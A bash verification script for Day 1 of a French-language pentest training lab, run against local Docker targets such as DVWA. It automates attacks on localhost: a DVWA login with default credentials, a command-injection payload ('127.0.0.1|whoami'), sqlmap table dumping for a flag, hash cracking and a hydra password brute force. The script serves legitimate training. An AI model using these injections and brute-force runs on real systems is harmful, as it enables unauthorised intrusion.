#!/bin/bash
# =====================================================================
# test_jour1.sh — Auto-verification exhaustive du Jour 1
# Usage: bash tests/test_jour1.sh
# =====================================================================
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT/env.sh" 2>/dev/null || { echo "[!] env.sh introuvable"; exit 1; }

PASS=0; WARN=0; FAIL=0

report() {
  local name="$1" status="$2" detail="${3:-}"
  case "$status" in
    PASS) ((PASS++)); echo "  ✅ $name";;
    WARN) ((WARN++)); echo "  ⚠️  $name — $detail";;
    FAIL) ((FAIL++)); echo "  ❌ $name — $detail";;
  esac
}

check_source_path() {
  local file="$1"
  local r=$(grep -c '/\.\./\.\.\.\./\.\.$' "$file" 2>/dev/null)
  [ "$r" -eq 0 ]
}

echo "========================================"
echo "  TEST JOUR 1 — $(date '+%Y-%m-%d %H:%M:%S')"
echo "========================================"
echo ""

# ─── 1.1 Tool versions ───
echo "--- 1.1 Tool versions ---"
python3 --version 2>&1 | grep -q "Python 3" && report "python3" PASS || report "python3" FAIL
docker --version 2>&1 | grep -q "Docker" && report "docker" PASS || report "docker" FAIL
nmap --version 2>&1 | head -1 | grep -q "Nmap" && report "nmap" PASS || report "nmap" FAIL
sqlmap --version 2>&1 | grep -qP '[\d.]+#stable' && report "sqlmap" PASS || report "sqlmap" FAIL
which nc &>/dev/null && report "nc" PASS || report "nc" FAIL

# ─── 1.2 Source path bug ───
echo "--- 1.2 Source path (../../.. bug) ---"
for script in setup_dvwa.sh lab_xss.sh lab_sqli.sh lab_cmdi.sh lab_sqli_app.sh; do
  f="$ROOT/labs_resolution/jour-01/$script"
  if [ -f "$f" ]; then
    check_source_path "$f" && report "$script source path" PASS || report "$script source path" WARN "contient encore ../../.."
  fi
done

# ─── 1.3 Docker services ───
echo "--- 1.3 Docker services ---"
SERVICES=$(docker compose ps --services 2>/dev/null | sort)
for s in dvwa sqli-app vsftpd buffovf waf secure-linux forensic-victim; do
  echo "$SERVICES" | grep -q "$s" && report "service $s" PASS || report "service $s" FAIL
done

# ─── 1.4 HTTP endpoints ───
echo "--- 1.4 HTTP endpoints ---"
curl -s -o /dev/null -w "%{http_code}" "http://localhost:$DVWA_PORT/login.php" 2>/dev/null | grep -q "200" && report "DVWA login.php 200" PASS || report "DVWA login.php 200" FAIL
curl -s -o /dev/null -w "%{http_code}" "http://localhost:$SQLI_APP_PORT/" 2>/dev/null | grep -q "200" && report "SQLi-app / 200" PASS || report "SQLi-app / 200" FAIL

# ─── LAB-2 Gobuster ───
echo "--- LAB-2: Gobuster ---"
if [ -f "$ROOT/rendu_labs/jour-01/gobuster_dvwa.txt" ]; then
  grep -q "config" "$ROOT/rendu_labs/jour-01/gobuster_dvwa.txt" && report "gobuster: config trouve" PASS || report "gobuster: config" FAIL
  grep -q "index.php" "$ROOT/rendu_labs/jour-01/gobuster_dvwa.txt" && report "gobuster: index.php trouve" PASS || report "gobuster: index.php" FAIL
else
  report "gobuster_dvwa.txt" WARN "fichier absent"
fi

# ─── LAB-2 login CSRF ───
echo "--- LAB-2: Login avec CSRF ---"
COOKIE=$(mktemp)
TOKEN=$(curl -s -c "$COOKIE" "http://localhost:$DVWA_PORT/login.php" 2>/dev/null | grep -oP "user_token' value='\K[a-f0-9]+")
if [ -n "$TOKEN" ]; then
  report "token CSRF extrait" PASS
  RESP=$(curl -sL -b "$COOKIE" -c "$COOKIE" -X POST "http://localhost:$DVWA_PORT/login.php" \
    -d "username=admin&password=password&user_token=$TOKEN&Login=Login" 2>/dev/null)
  echo "$RESP" | grep -q "Welcome" && report "login Welcome" PASS || report "login POST" WARN "Welcome non trouve"
else
  report "token CSRF" FAIL "impossible d extraire le token"
fi

# ─── LAB-2 security low ───
echo "--- LAB-2: Security low ---"
SEC_PAGE=$(curl -s -b "$COOKIE" "http://localhost:$DVWA_PORT/security.php" 2>/dev/null)
STOKEN=$(echo "$SEC_PAGE" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "http://localhost:$DVWA_PORT/security.php" \
  -d "security=low&seclev_submit=Submit&user_token=$STOKEN" -o /dev/null 2>/dev/null
grep -q "security" "$COOKIE" && report "security=low cookie" PASS || report "security=low cookie" FAIL

# ─── LAB-2 test-empty/ ───
echo "--- LAB-2: test-empty/ ---"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$DVWA_PORT/test-empty/" 2>/dev/null)
[ "$CODE" = "403" ] && report "test-empty/ 403" PASS || report "test-empty/ 403" WARN "code=$CODE (attendu 403)"

rm -f "$COOKIE"

# ─── LAB-3 XSS ───
echo "--- LAB-3: XSS ---"
LAB_XSS_OUT=$("$ROOT/labs_resolution/jour-01/lab_xss.sh" 2>&1)
echo "$LAB_XSS_OUT" | grep -q "XSS REFLECTED" && report "XSS Reflected" PASS || report "XSS Reflected" FAIL
echo "$LAB_XSS_OUT" | grep -q "XSS STORED" && report "XSS Stored" PASS || report "XSS Stored" FAIL

# ─── LAB-4 SQLi ───
echo "--- LAB-4: SQLi DVWA ---"
LAB_SQLI_OUT=$("$ROOT/labs_resolution/jour-01/lab_sqli.sh" --dump 2>&1)
echo "$LAB_SQLI_OUT" | grep -qP '(admin|gordonb|1337|pablo|smithy)' && report "SQLi: users dumps ok" PASS || report "SQLi: users" WARN "utilisateurs non trouves"

# ─── LAB-5 CMDi ───
echo "--- LAB-5: CMDi ---"
COOKIE=$(mktemp)
TOKEN=$(curl -s -c "$COOKIE" "http://localhost:$DVWA_PORT/login.php" 2>/dev/null | grep -oP "user_token' value='\K[a-f0-9]+")
curl -s -b "$COOKIE" -c "$COOKIE" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -o /dev/null 2>/dev/null
WHOAMI=$(curl -s -b "$COOKIE" -c "$COOKIE" -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
  -d "ip=127.0.0.1|whoami&Submit=Submit" 2>/dev/null | grep -oP "(?<=<pre>)[^<]+" | grep -v "^PING\|^64 bytes\|^---\|^round\|^[0-9]")
echo "$WHOAMI" | grep -q "www-data" && report "CMDi: whoami=www-data" PASS || report "CMDi: whoami" WARN "attendu www-data, obtenu: $WHOAMI"
rm -f "$COOKIE"

# ─── LAB-6 SQLi avancee ───
echo "--- LAB-6: SQLi avancee ---"
LAB_SQLI_APP_OUT=$("$ROOT/labs_resolution/jour-01/lab_sqli_app.sh" 2>&1)
echo "$LAB_SQLI_APP_OUT" | grep -q "3.46" && report "Point 1: UNION SQLite" PASS || report "Point 1: UNION" FAIL
echo "$LAB_SQLI_APP_OUT" | grep -q "Connecté" && report "Point 2: auth bypass" PASS || report "Point 2: auth bypass" FAIL
echo "$LAB_SQLI_APP_OUT" | grep -q "flag_user\|5f4dcc3" && report "Point 3: LIKE injection" PASS || report "Point 3: LIKE injection" FAIL
FLAG=$(sqlmap -u "http://localhost:$SQLI_APP_PORT/?page=search&id=1" --batch --dbms=sqlite -T products --dump 2>/dev/null | grep -oP 'FLAG\{[^}]+\}')
[ -n "$FLAG" ] && report "Flag: $FLAG" PASS || report "Flag" WARN "FLAG introuvable"

# ─── LAB-6 hash cracking ───
echo "--- LAB-6: Hash cracking ---"
CRACK_OUT=$("$ROOT/labs_resolution/jour-01/crack_hashes.sh" 2>&1)
echo "$CRACK_OUT" | grep -qE "Tous les hashs sont crackés" && report "Hash cracking 6/6" PASS || report "Hash cracking" WARN "certains hashs non craques (john v1.9.0 raw-md5)"

# ─── LAB-7 Hydra ───
echo "--- LAB-7: Hydra ---"
echo -e "admin\njohn_doe\njane_dev" > /tmp/test_hydra_logins.txt
HYDRA_OUT=$(hydra -L /tmp/test_hydra_logins.txt -P /tmp/passwords_test.txt \
  -s "$SQLI_APP_PORT" localhost http-post-form \
  "/index.php:page=login&username=^USER^&password=^PASS^:Connecté" -F -t 2 2>&1)
echo "$HYDRA_OUT" | grep -q "valid password found" && report "Hydra: couple trouve" PASS || report "Hydra" WARN "aucun couple trouve"
rm -f /tmp/test_hydra_logins.txt

# ─── Summary ───
echo ""
echo "========================================"
echo "  BILAN : $PASS PASS / $WARN WARN / $FAIL FAIL"
echo "========================================"

# Exit code
[ "$FAIL" -gt 0 ] && exit 1 || exit 0
